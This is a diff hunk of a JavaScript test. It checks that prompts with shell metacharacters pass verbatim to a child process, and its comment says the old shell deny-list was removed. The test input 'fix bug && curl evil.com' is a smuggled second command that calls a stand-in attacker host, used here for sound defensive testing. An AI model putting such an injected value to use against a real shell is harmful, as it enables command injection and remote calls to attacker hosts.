@@ -286,9 +286,11 @@ test("task --model passes shell-metachar prompts verbatim under shell:false (arg
   // Under shell:false — tests (COPILOT_COMPANION_COPILOT_COMMAND set),
   // Linux / macOS production — Node hands argv directly to CreateProcess
   // / execve, so metacharacters like `&&` are literal text and no
-  // injection is possible. Lock in that the deny-list does NOT fire on
-  // this path; the shell:true branch is inspected via the unit tests on
-  // SHELL_METACHAR_RE (see tests/shell-metachar-regex.test.mjs).
+  // injection is possible. v0.0.18 dropped the shell:true production
+  // path entirely (replaced by `lib/safe-spawn.mjs`'s cross-spawn-style
+  // escaping); the `assertNoShellMetachars` deny-list and its dedicated
+  // test file went with it. This test now just locks in that
+  // metacharacters in argv reach the child verbatim.
   const pluginData = makeTempDir();
   const result = runCompanion(
     ["task", "--model", "haiku", "fix bug && curl evil.com"],
